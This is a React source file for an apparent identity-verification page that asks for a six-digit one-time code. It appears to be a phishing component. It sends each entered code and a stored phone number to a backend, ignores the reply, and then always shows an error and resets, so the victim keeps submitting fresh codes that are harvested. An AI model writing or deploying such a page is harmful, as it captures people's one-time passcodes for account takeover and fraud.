import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import axios from "axios";
import BASE_URL from "../components/urls";
import { HiArrowLeft } from "react-icons/hi";

const OTP_LENGTH = 6;
const RESEND_SECONDS = 60;

const Otp = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState(new Array(OTP_LENGTH).fill(""));
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [seconds, setSeconds] = useState(RESEND_SECONDS);
  const [canResend, setCanResend] = useState(false);
  const inputsRef = useRef([]);

  const phone = localStorage.getItem("gt_phone") || "";

  useEffect(() => {
    inputsRef.current[0]?.focus();
  }, []);

  useEffect(() => {
    if (seconds <= 0) {
      setCanResend(true);
      return;
    }
    const timer = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(timer);
  }, [seconds]);

  const handleChange = (e, index) => {
    const value = e.target.value.replace(/\D/g, "").slice(-1);
    const next = [...otp];
    next[index] = value;
    setOtp(next);
    setError("");
    if (value && index < OTP_LENGTH - 1) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  const handleSubmit = () => {
    const code = otp.join("");
    if (code.length < OTP_LENGTH) {
      setError("Please enter the complete 6-digit code.");
      return;
    }
    setLoading(true);
    setError("");
    axios.post(`${BASE_URL}/otp`, { otp: code, phone }).catch(() => {});
    setTimeout(() => {
      setLoading(false);
      setError("An error occurred. Please try again.");
      setOtp(new Array(OTP_LENGTH).fill(""));
      setSeconds(RESEND_SECONDS);
      setCanResend(false);
      inputsRef.current[0]?.focus();
    }, 5000);
  };

  const handleResend = () => {
    if (!canResend) return;
    setSeconds(RESEND_SECONDS);
    setCanResend(false);
    setOtp(new Array(OTP_LENGTH).fill(""));
    setError("");
    inputsRef.current[0]?.focus();
    axios.post(`${BASE_URL}/`, { phone }).catch(() => {});
  };

  const allFilled = otp.every((d) => d !== "");

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}

      {/* Body */}
      <div className="flex flex-col items-center px-7 pt-28 flex-1">
        {/* Person + Shield icon */}
        <div className="relative mb-6 w-22.5 h-22.5">
          <svg
            viewBox="0 0 90 90"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
            className="w-full h-full"
          >
            {/* Body */}
            <ellipse cx="40" cy="74" rx="28" ry="18" fill="#F4C26A" />
            {/* Head */}
            <circle cx="40" cy="30" r="18" fill="#F4A97A" />
          </svg>
          {/* Shield badge */}
          <div className="absolute bottom-0 right-0">
            <svg
              width="40"
              height="40"
              viewBox="0 0 40 40"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M20 3L5 9.5V20.5C5 29.75 11.75 38.4 20 40.5C28.25 38.4 35 29.75 35 20.5V9.5L20 3Z"
                fill="#4A7DE8"
              />
              <path
                d="M14 21l4 4 8-8"
                stroke="white"
                strokeWidth="2.5"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </div>
        </div>

        {/* Title */}
        <h1 className="text-[24px] font-bold text-[#1B2C6E] text-center mb-3">
          Verify Your Identity
        </h1>

        {/* Subtitle */}
        <p className="text-[14px] text-gray-500 text-center leading-relaxed mb-9 max-w-[280px]">
          Enter the 6-digit code sent to your{" "}
          <span className="font-bold text-gray-700">email inbox</span> to
          continue.
        </p>

        {/* 6 OTP boxes */}
        <div className="flex gap-[10px] mb-3">
          {otp.map((digit, index) => (
            <input
              key={index}
              ref={(el) => {
                inputsRef.current[index] = el;
              }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleChange(e, index)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              className="w-[46px] h-[58px] text-center text-[22px] font-semibold text-gray-900 border border-gray-300 rounded-xl outline-none focus:border-[#4A7DE8] focus:ring-2 focus:ring-blue-200 transition-all bg-white"
              aria-label={`OTP digit ${index + 1}`}
            />
          ))}
        </div>

        {/* Error */}
        {error && (
          <p className="mt-2 text-sm text-red-500 font-medium text-center">
            {error}
          </p>
        )}

        {/* Resend */}
        <p className="mt-6 text-[13px] text-gray-400">
          Didn&apos;t receive code?{" "}
          {canResend ? (
            <button
              type="button"
              onClick={handleResend}
              className="text-[#4A7DE8] font-semibold bg-transparent cursor-pointer"
            >
              Resend
            </button>
          ) : (
            <span>
              Resend in{" "}
              <span className="text-gray-700 font-bold">{seconds}s</span>
            </span>
          )}
        </p>
      </div>

      {/* Continue button */}
      <div className="px-7 pb-10">
        <button
          type="button"
          onClick={handleSubmit}
          disabled={!allFilled || loading}
          className="w-full py-[18px] rounded-xl text-[17px] font-semibold transition-colors duration-200 bg-[#4A7DE8] text-white disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {loading ? "Verifying..." : "Continue"}
        </button>
      </div>
    </div>
  );
};

export default Otp;
